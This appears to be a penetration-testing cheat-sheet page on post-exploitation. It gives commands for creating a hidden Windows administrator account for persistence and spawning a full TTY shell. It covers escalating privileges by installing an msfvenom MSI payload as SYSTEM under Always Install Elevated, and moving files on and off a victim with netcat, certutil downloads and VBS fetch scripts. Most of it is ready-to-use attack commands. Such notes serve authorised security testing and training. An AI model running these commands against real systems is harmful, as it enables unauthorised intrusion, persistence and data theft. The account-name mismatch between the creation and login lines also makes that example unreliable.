---
title: Exploitation
---

[Home](./)

_Ensuring you don't have to re-exploit over and over again_

## Creating Windows Admin Account
```bash
# Victim
net user /add jack sparrow
net localgroup administrators jack /add

# Connect with
rdesktop -u jim -p sparrow [IP-ADDRESS]
```

## Executing in Memory - TMPFS

```bash
mount | grep ^tmp

# Example:
# tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)
# tmpfs on /tmp type tmpfs (rw,nosuid,nodev)
#
# Beware of the "noexec" flag; executing programs will fail
```

## Get full TTY shell
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

## Switch user

```bash
su $USER
```

## Run Single command as a different user

### Linux

```bash
sudo -u $USER $cmd
```

### Windows 

```bash
echo "$PASSWORD" | runas /profile /user:$USER “$COMMAND”
```

+ [sudo.cmd](./assests/sudo.cmd)<sup><sub>[[copy&paste](assets/files/sudo.cmd.txt)]


## Windows Privilege Escalation

### Windows Service / DLL Templates

+ [windows_dll.c](https://github.com/sagishahar/scripts/blob/master/windows_dll.c) <sup><sub>[[archive](assets/files/windows_dll.c)]

+ [windows_service.c](https://github.com/sagishahar/scripts/blob/master/windows_service.c) <sup><sub>[[archive](assets/files/windows_service.c)]

#### Cross-compiling for Windows

##### C & C++

```bash
# Setup
apt install mingw-w64

# x86
x86_64-w64-mingw32-gcc [src.c] [-libraries] -o [dst]
i686-w64-mingw32-gcc [src.c] [-libraries] -o [dst] -lws2_32

# x64
i686-w64-mingw32-gcc [src.c] [-libraries] -o [dst]
```

##### C#

```bash
# Setup 
# Add repo with https://www.mono-project.com/download/stable/
sudo apt-get install mono-complete msbuild mono-roslyn

# Building
msbuild [src.sln]
```

#### Using Python Scripts without Python installed
[PyInstaller](https://github.com/pyinstaller/pyinstaller) <sup><sub>[[archive](assets/files/PyInstaller-3.6.zip)]
```bash
pyinstaller yourprogram.py
```

### Always Install Elevated
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
reg query HKCU\Software\Policies\Microsoft\Windows\Installer

# If both of these are 0x1 - you can install msi packages as system.
# Generate MSI Payload with:
msfvenom [blah blah blah] -f msi -o setup.msi

# Execute it with:
msiexec /quiet /qn /i setup.msi

```

## Exfiltration

+ SSH Copy (scp)

```bash
scp user@hostname:/path/to/src user@hostname:/path/to/dst
```

+ Netcat

```bash
# Victim
nc -nvlp $RPORT > out.file

# Attacker
nc -nv $RHOST $RPORT < in.file
```

+ exe2bat

```bash
# Convert a windows executable to a copy and paste set of commands
wine $(locate exe2bat.exe) nc.exe nc.txt
```

+ certutil.exe

```bash
certutil.exe -urlcache -split -f “$URL” $FILENAME
```

+ [zip.vbs](assets/files/zip.vbs) <sup><sub>[[copy&paste](assets/files/zip.vbs.txt)]

```bash
CScript zip.vbs $SRC $DEST
```

+ [wget.vbs](assets/files/wget.vbs) <sup><sub>[[copy&paste](assets/files/wget.vbs.txt)]

```bash
CScript wget.vbs $SRC $DEST
```

## Fun Tips

### Linux Write a file without a text editor

```bash
cat <<EOF> [file]
```